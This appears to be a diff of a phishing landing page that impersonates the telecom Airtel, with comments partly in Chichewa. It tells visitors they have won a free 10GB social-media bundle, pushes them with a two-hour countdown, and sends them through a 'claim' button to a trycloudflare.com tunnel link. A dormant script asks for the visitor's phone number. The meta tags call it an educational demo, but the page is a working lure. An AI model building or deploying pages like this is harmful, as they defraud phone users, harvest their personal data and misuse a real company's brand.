@@ -1,7 +1,8 @@
-<!DOCTYPE html>  <html lang="en">  
-<head>  
-  <meta charset="UTF-8">  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Airtel promotion</title>
   <!-- WhatsApp / Facebook Preview -->
   <meta property="og:title" content="Airtel Promotion — DEMO">
@@ -18,369 +19,347 @@
   <meta name="twitter:title" content="Airtel Promotion — DEMO">
   <meta name="twitter:description" content="Educational promotion demonstration.">
   <meta name="twitter:image" content="https://airtel-promotion.vercel.app/airtel.png">
-  
-  <style>  
-    * {  
-  box-sizing: border-box;  
-  margin: 0;
-  padding: 0;  
-}  body {
-font-family: Arial, sans-serif;
-background: linear-gradient(135deg, #fd0404, #f70202);
-min-height: 100vh;
-}
 
-.overlay {
-min-height: 100vh;
-display: flex;
-align-items: center;
-justify-content: center;
-padding: 18px;
-background: rgba(255, 0, 0, 0.35);
-}
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-.popup {
-width: 100%;
-max-width: 390px;
-position: relative;
-background: white;
-border-radius: 24px;
-padding: 30px 22px 22px;
-text-align: center;
-box-shadow: 0 20px 60px rgba(0,0,0,.35);
-animation: popup .45s ease;
-}
+    body {
+      font-family: Arial, sans-serif;
+      /* BACKGROUND IMAGE */
+      background-image: url('airtel.png'); /* <-- Sinthani dzina la chithunzi chanu pano */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      min-height: 100vh;
+    }
 
-@keyframes popup {
-from {
-opacity: 0;
-transform: scale(.85);
-}
+    .overlay {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 18px;
+      /* CHETERO: overlay yopepuka kuti chithunzi chisamaonekere kwambiri */
+      background: rgba(255, 0, 0, 0.55);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+    }
 
-to {
-opacity: 1;
-transform: scale(1);
-}
-}
+    .popup {
+      width: 100%;
+      max-width: 390px;
+      position: relative;
+      background: white;
+      border-radius: 24px;
+      padding: 30px 22px 22px;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, .35);
+      animation: popup .45s ease;
+    }
 
-.close {
-position: absolute;
-right: 15px;
-top: 12px;
-border: none;
-background: #f1f1f1;
-width: 34px;
-height: 34px;
-border-radius: 50%;
-font-size: 24px;
-color: #555;
-}
-.close {
-display: none;
-}
+    @keyframes popup {
+      from { opacity: 0; transform: scale(.85); }
+      to   { opacity: 1; transform: scale(1); }
+    }
 
-.gift {
-font-size: 58px;
-margin-bottom: 8px;
-color: #16803c;
-animation: gentlePulse 2s ease-in-out infinite;
-}
+    .close {
+      position: absolute;
+      right: 15px;
+      top: 12px;
+      border: none;
+      background: #f1f1f1;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      font-size: 24px;
+      color: #555;
+      display: none;
+    }
 
-@keyframes gentlePulse {
-0%, 100% {
-transform: scale(1);
-}
+    .gift {
+      font-size: 58px;
+      margin-bottom: 8px;
+      color: #16803c;
+      animation: gentlePulse 2s ease-in-out infinite;
+    }
 
-50% {
-transform: scale(1.08);
-}
-}
+    @keyframes gentlePulse {
+      0%, 100% { transform: scale(1); }
+      50%      { transform: scale(1.08); }
+    }
 
-.badge {
-display: inline-block;
-background: #eee7ff;
-color: #f1190a;
-font-size: 11px;
-font-weight: bold;
-padding: 7px 12px;
-border-radius: 30px;
-letter-spacing: .5px;
-}
+    .badge {
+      display: inline-block;
+      background: #eee7ff;
+      color: #f1190a;
+      font-size: 11px;
+      font-weight: bold;
+      padding: 7px 12px;
+      border-radius: 30px;
+      letter-spacing: .5px;
+    }
 
-h1 {
-margin-top: 15px;
-font-size: 30px;
-color: #171717;
-}
+    h1 {
+      margin-top: 15px;
+      font-size: 30px;
+      color: #171717;
+    }
 
-.main-text {
-margin-top: 10px;
-color: #666;
-line-height: 1.5;
-}
+    .main-text {
+      margin-top: 10px;
+      color: #666;
+      line-height: 1.5;
+    }
 
-.main-text strong {
-color: #f30202;
-}
+    .main-text strong { color: #f30202; }
 
-.bundle {
-margin: 22px 0;
-padding: 18px;
-border-radius: 18px;
-background: linear-gradient(135deg, #6428d8, #fc0303);
-color: white;
-display: flex;
-align-items: center;
-gap: 15px;
-text-align: left;
-}
+    .bundle {
+      margin: 22px 0;
+      padding: 18px;
+      border-radius: 18px;
+      background: linear-gradient(135deg, #6428d8, #fc0303);
+      color: white;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      text-align: left;
+    }
 
-.gb {
-font-size: 27px;
-font-weight: 800;
-}
+    .gb {
+      font-size: 27px;
+      font-weight: 800;
+    }
 
-.bundle strong {
-display: block;
-font-size: 15px;
-}
+    .bundle strong { display: block; font-size: 15px; }
 
-.bundle span {
-display: block;
-margin-top: 5px;
-font-size: 12px;
-opacity: .85;
-}
+    .bundle span {
+      display: block;
+      margin-top: 5px;
+      font-size: 12px;
+      opacity: .85;
+    }
 
-.small {
-color: #777;
-font-size: 12px;
-line-height: 1.5;
-}
+    .small {
+      color: #777;
+      font-size: 12px;
+      line-height: 1.5;
+    }
 
-.claim {
-display: block;
-width: 100%;
-padding: 15px;
-border: none;
-border-radius: 14px;
-background: #ff2a04;
-color: white;
-text-decoration: none;
-font-size: 16px;
-font-weight: bold;
-text-align: center;
-cursor: pointer;
+    .claim {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 14px;
+      background: #ff2a04;
+      color: white;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: bold;
+      text-align: center;
+      cursor: pointer;
+      animation: pulse 1.4s infinite;
+    }
 
-animation: pulse 1.4s infinite;
-}
+    @keyframes pulse {
+      0%   { transform: scale(1);    box-shadow: 0 0 0 0 rgba(66, 8, 180, 0.7); }
+      50%  { transform: scale(1.06); box-shadow: 0 0 0 12px rgba(100, 40, 216, 0); }
+      100% { transform: scale(1);    box-shadow: 0 0 0 0 rgba(100, 40, 216, 0); }
+    }
 
-@keyframes pulse {
-0% {
-transform: scale(1);
-box-shadow: 0 0 0 0 rgba(66, 8, 180, 0.7);
-}
+    .claim:active { transform: scale(0.95); }
 
-50% {
-transform: scale(1.06);
-box-shadow: 0 0 0 12px rgba(100, 40, 216, 0);
-}
+    #message {
+      margin-top: 12px;
+      color: #16803c;
+      font-size: 13px;
+      font-weight: bold;
+    }
 
-100% {
-transform: scale(1);
-box-shadow: 0 0 0 0 rgba(100, 40, 216, 0);
-}
-}
+    .footer {
+      margin-top: 18px;
+      font-size: 10px;
+      color: #999;
+    }
 
-.claim:active {
-transform: scale(0.95);
-}
+    .marquee-container {
+      width: 100%;
+      overflow: hidden;
+      background: #f80202;
+      color: white;
+      padding: 12px 0;
+      white-space: nowrap;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1000;
+    }
 
-#message {
-margin-top: 12px;
-color: #16803c;
-font-size: 13px;
-font-weight: bold;
-}
+    .marquee {
+      width: 100%;
+      overflow: hidden;
+      background: #f80202;
+      color: white;
+      border-radius: 10px;
+      padding: 10px 0;
+      margin-bottom: 20px;
+      white-space: nowrap;
+    }
 
-.footer {
-margin-top: 18px;
-font-size: 10px;
-color: #999;
-}
+    .marquee-text {
+      display: inline-block;
+      padding-left: 100%;
+      animation: scrollText 12s linear infinite;
+      font-size: 15px;
+      font-weight: bold;
+    }
 
-.marquee-container {
-width: 100%;
-overflow: hidden;
-background: #f80202;
-color: white;
-padding: 12px 0;
-white-space: nowrap;
-position: fixed;
-top: 0;
-left: 0;
-z-index: 1000;
-}
+    @keyframes scrollText {
+      from { transform: translateX(0); }
+      to   { transform: translateX(-100%); }
+    }
 
-.marquee {
-width: 100%;
-overflow: hidden;
-background: #f80202;
-color: white;
-border-radius: 10px;
-padding: 10px 0;
-margin-bottom: 20px;
-white-space: nowrap;
-}
+    .countdown-title {
+      margin-top: 8px;
+      color: #555;
+      font-size: 13px;
+      font-weight: bold;
+    }
 
-.marquee-text {
-display: inline-block;
-padding-left: 100%;
-animation: scrollText 12s linear infinite;
-font-size: 15px;
-font-weight: bold;
-}
+    .countdown {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 7px;
+      margin: 12px 0 20px;
+    }
 
-@keyframes scrollText {
-from {
-transform: translateX(0);
-}
+    .time-box {
+      min-width: 62px;
+      padding: 9px 6px;
+      background: #f80202;
+      color: white;
+      border-radius: 10px;
+      text-align: center;
+    }
 
-to {
-transform: translateX(-100%);
-}
-}
-.countdown-title {
-margin-top: 8px;
-color: #555;
-font-size: 13px;
-font-weight: bold;
-}
+    .time-box span {
+      display: block;
+      font-size: 23px;
+      font-weight: 800;
+    }
 
-.countdown {
-display: flex;
-justify-content: center;
-align-items: center;
-gap: 7px;
-margin: 12px 0 20px;
-}
+    .time-box small {
+      font-size: 9px;
+      font-weight: bold;
+    }
 
-.time-box {
-min-width: 62px;
-padding: 9px 6px;
-background: #f80202;
-color: white;
-border-radius: 10px;
-text-align: center;
-}
+    .colon {
+      font-size: 23px;
+      font-weight: bold;
+      color: #f80202;
+    }
+  </style>
 
-.time-box span {
-display: block;
-font-size: 23px;
-font-weight: 800;
-}
+</head>
+<body>
 
-.time-box small {
-font-size: 9px;
-font-weight: bold;
-}
+  <div class="overlay">
+    <div class="popup">
+      <div class="marquee">
+        <div class="marquee-text">
+          🎉 AIRTEL REWARDS PROMOTION • 10GB FACEBOOK + TIKTOK & WHATSAPP BUNDLE 🎁
+        </div>
+      </div>
 
-.colon {
-font-size: 23px;
-font-weight: bold;
-color: #f80202;
-}
-</style>
+      <button class="close">&times;</button>
 
-</head>  
-<body>    <div class="overlay">  
-    <div class="popup">  
-        <div class="marquee">  
-  <div class="marquee-text">  
-    🎉 AIRTEL REWARDS PROMOTION • 10GB FACEBOOK + TIKTOK & WHATSAPP BUNDLE 🎁  
-  </div>  
-</div>  <button class="close">&times;</button>  
+      <div class="gift">10GB</div>
 
-  <div class="gift">10GB</div>  
+      <div class="badge">AIRTEL INTERNET BUNDLE</div>
 
-  <div class="badge">AIRTEL INTERNET BUNDLE</div>  
+      <h1>Congratulations!</h1>
 
-  <h1>Congratulations!</h1>  
+      <p class="main-text">
+        You have been selected for a
+        <strong>10GB Social Bundle</strong>.
+      </p>
 
+      <div class="countdown-title">chitani machawi nthawi isadathe:</div>
+      <div class="countdown">
+        <div class="time-box">
+          <span id="hours">02</span>
+          <small>HOURS</small>
+        </div>
+        <div class="colon">:</div>
+        <div class="time-box">
+          <span id="minutes">00</span>
+          <small>MIN</small>
+        </div>
+        <div class="colon">:</div>
+        <div class="time-box">
+          <span id="seconds">00</span>
+          <small>SEC</small>
+        </div>
+      </div>
 
+      <script>
+        let totalSeconds = 2 * 60 * 60;
 
-  <p class="main-text">  
-    You have been selected for a  
-    <strong>10GB Social Bundle</strong>.  
-  </p>
+        function updateCountdown() {
+          const hours = Math.floor(totalSeconds / 3600);
+          const minutes = Math.floor((totalSeconds % 3600) / 60);
+          const seconds = totalSeconds % 60;
 
-<div class="countdown-title"> chitani machawi nthawi isadathe:</div>  <div class="countdown">  
-  <div class="time-box">  
-    <span id="hours">02</span>  
-    <small>HOURS</small>  
-  </div>    <div class="colon">:</div>    <div class="time-box">  
-    <span id="minutes">00</span>  
-    <small>MIN</small>  
-  </div>    <div class="colon">:</div>    <div class="time-box">  
-    <span id="seconds">00</span>  
-    <small>SEC</small>  
-  </div>  
-</div>  
-      <script>  
-let totalSeconds = 2 * 60 * 60;  function updateCountdown() {
-const hours = Math.floor(totalSeconds / 3600);
-const minutes = Math.floor((totalSeconds % 3600) / 60);
-const seconds = totalSeconds % 60;
+          document.getElementById("hours").textContent = String(hours).padStart(2, "0");
+          document.getElementById("minutes").textContent = String(minutes).padStart(2, "0");
+          document.getElementById("seconds").textContent = String(seconds).padStart(2, "0");
 
-document.getElementById("hours").textContent =
-String(hours).padStart(2, "0");
+          if (totalSeconds > 0) {
+            totalSeconds--;
+          } else {
+            clearInterval(timer);
+          }
+        }
 
-document.getElementById("minutes").textContent =
-String(minutes).padStart(2, "0");
+        updateCountdown();
+        const timer = setInterval(updateCountdown, 1000);
+      </script>
 
-document.getElementById("seconds").textContent =
-String(seconds).padStart(2, "0");
+      <div class="bundle">
+        <div class="gb">10GB</div>
+        <div>
+          <strong>Facebook + TikTok</strong>
+          <span>Social Bundle Reward</span>
+        </div>
+      </div>
 
-if (totalSeconds > 0) {
-totalSeconds--;
-} else {
-clearInterval(timer);
-}
-}
+      <a href="https://applying-ethical-left-sip.trycloudflare.com"
+         class="claim"
+         target="_blank"
+         rel="noopener noreferrer">
+        Dinani pano
+      </a>
 
-updateCountdown();
+      <p id="message"></p>
 
-const timer = setInterval(updateCountdown, 1000);
-</script>
-<div class="bundle">
+      <div class="footer">
+        Airtel internet bundle is valid for 2 hrs. Terms and conditions apply.
+      </div>
+    </div>
+  </div>
 
-<div class="gb">10GB</div>  
-    <div>  
-      <strong>Facebook + TikTok</strong>  
-      <span>Social Bundle Reward</span>  
-    </div>  
-  </div>  
+  <script>
+    function showDemo() {
+      document.getElementById("message").textContent =
+        "Please write your phone number and click the button below to claim your reward";
+    }
+  </script>
 
-    
-
-  <a href="https://applying-ethical-left-sip.trycloudflare.com"  
-class="claim"  
-target="_blank"  
-rel="noopener noreferrer">  
- Dinani pano
-
-</a>  <p id="message"></p>  
-
-  <div class="footer">  
-    Airtel internet bundle is valid for 2 hrs. Terms and conditions apply.  
-  </div>  
-
-</div>
-
-  </div>    <script>  
-    function showDemo() {  
-      document.getElementById("message").textContent =  
-        "Please write your phone number and click the button below to claim your reward";  
-    }  
-  </script>  </body>  
-  </html>
+</body>
+</html>
